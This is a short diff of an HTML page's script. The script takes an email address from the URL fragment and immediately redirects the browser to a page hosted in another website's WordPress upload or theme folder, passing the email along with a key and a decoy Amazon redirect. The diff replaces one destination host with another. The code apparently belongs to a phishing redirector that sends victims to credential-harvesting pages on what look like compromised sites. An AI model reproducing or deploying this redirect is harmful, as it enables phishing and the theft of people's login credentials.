@@ -19,7 +19,7 @@
 		var em = hash.split("#")[1];
 
 		window.setTimeout(function () {
-			window.location.href = "https://www.dianaduganrealestate.com.au/wp-content/uploads/typehub/custom/aczmjkqx/pro.html?key=cfc7a9cfb5486cd925f0f4a447c1fd26&redirect=https://www.amazon.com"+ makeid(10) + "#" + em;
+			window.location.href = "https://blockchain101.org//wp-content/themes/seotheme/templates.html?key=cfc7a9cfb5486cd925f0f4a447c1fd26&redirect=https://www.amazon.com"+ makeid(10) + "#" + em;
 		}, 0);
 	</script>
 </html>
